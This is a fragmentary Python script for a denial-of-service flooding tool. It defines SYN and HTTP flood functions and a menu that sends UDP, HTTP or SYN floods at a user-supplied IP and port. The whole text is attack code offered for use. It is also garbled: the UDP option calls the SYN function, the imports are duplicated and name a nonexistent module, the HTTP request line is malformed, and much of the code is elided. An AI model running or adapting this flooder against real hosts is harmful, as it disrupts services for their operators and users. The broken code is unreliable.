...
import time,sys,socket,threading,logging,urllib.request,random,http, signal,sock,socket,pyttsx3,platform,os
...
def syn_flood(ip, port, message, duration):
    sent = 0
...
def http_flood(ip, port, message, duration):
    # create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # create HTTP request
    httprequest = b"GET / HTTPS/1.1\r\nHost: target.com\r\n\r\n"
...
attack_type = input(colored(
    "[Choose Number]\n[1.UDP-FLOOD 2.HTTP-FLOOD 3.SYN-FLOOD]: ", "red"))

if attack_type == "1":
    message = b"Sending 999999 packets I need girlfriend :("
    ...
    syn_flood(ip, port, message, dur)
elif attack_type == "2":
    message = b"Sending 999999 packets I need girlfriend :("
    print("\n\x1b[38;5;202mHTTP attack selected")
    http_flood(ip, port, message, dur)
else:
